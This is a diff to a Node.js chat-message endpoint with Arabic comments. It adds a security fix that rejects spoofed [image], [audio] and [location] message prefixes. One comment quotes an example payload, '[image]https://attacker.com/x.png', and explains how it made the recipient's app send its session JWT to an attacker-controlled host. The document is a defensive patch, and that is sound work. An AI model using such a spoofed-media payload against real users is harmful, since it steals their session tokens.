@@ -9,10 +9,30 @@ function normalizeChatText(input) {
   s = s.replace(/[\u064B-\u065F\u0670ـ\s\-_.()\[\]{}|\\/,:;،]+/g, '');
   return s;
 }
+// [SEC-FIX-C1] الصيغ [image]/[audio]/[location] بأول الرسالة تُفسّرها واجهة
+// فلاتر (MessageModel.isImage/isAudio/isLocation) كوسائط، وفتح الصورة الكاملة
+// كان يُرفق Authorization: Bearer <JWT> لأي رابط بلا تمييز (انظر chat_bubble.dart).
+// [image] و[audio] ليس لهما أي مسار شرعي عبر endpoint الرسائل النصية هذا على
+// الإطلاق — الوحيدان الشرعيان لإنشائهما هما POST /requests/:id/images
+// و/requests/:id/audio نفسهما (يُدرجان الرسالة مباشرة، لا يمرّان بهذا الراوت)،
+// فيُرفضان دوماً هنا. [location] مختلف: SEND الموقع الشرعي بالتطبيق يمر فعلاً
+// عبر هذا الـendpoint بالذات (ChatApi.sendLocation ← sendMessage) بصيغة رقمية
+// صارمة فقط، فتُسمح فقط بهذه الصيغة تحديداً. أي شيء آخر بهذه البادئات الثلاث —
+// مثل "[image]https://attacker.com/x.png" — كان يُقبل ويُخزَّن كرسالة نصية
+// عادية بلا أي تحقق، فيفسّره الطرف الآخر كصورة ويُرسِل توكن جلسته لخادم
+// المهاجم عند فتح الصورة كاملة.
+const LOCATION_BODY_RE = /^\[location\]-?\d{1,2}\.\d+,-?\d{1,3}\.\d+$/;
+function isSpoofedMediaBody(body) {
+  const rawBody = String(body || '');
+  if (rawBody.startsWith('[image]') || rawBody.startsWith('[audio]')) return true;
+  if (rawBody.startsWith('[location]')) return !LOCATION_BODY_RE.test(rawBody);
+  return false;
+}
+
 function chatViolationReason(body) {
   const rawBody = String(body || '');
   // Internal app payloads are allowed: location and audio do not reveal phone/WhatsApp.
-  if (/^\[location\]-?\d{1,2}\.\d+,-?\d{1,3}\.\d+$/.test(rawBody)) return '';
+  if (LOCATION_BODY_RE.test(rawBody)) return '';
   if (/^\[audio\]\/uploads\/audios\/[A-Za-z0-9_.-]+$/.test(rawBody)) return '';
   const original = rawBody;
   const lower = String(body || '').toLowerCase()
@@ -84,6 +104,8 @@ module.exports = function (deps) {
     }
     const body = clean(req.body.body); if (body.length < 1) return res.status(400).json({ error: 'الرسالة فارغة' });
     if (body.length > 1000) return res.status(400).json({ error: 'الرسالة طويلة جداً، الحد الأقصى 1000 حرف' });
+    // [SEC-FIX-C1] راجع التعليق فوق isSpoofedMediaBody أعلى الملف.
+    if (isSpoofedMediaBody(body)) return res.status(400).json({ error: 'صيغة رسالة غير مسموحة' });
     if (rejectBlockedChat(req, res, r, body)) return;
     db.prepare('INSERT INTO messages(request_id,sender_id,body) VALUES(?,?,?)').run(r.id, req.user.id, body);
     markChatRead(r.id, req.user.id);
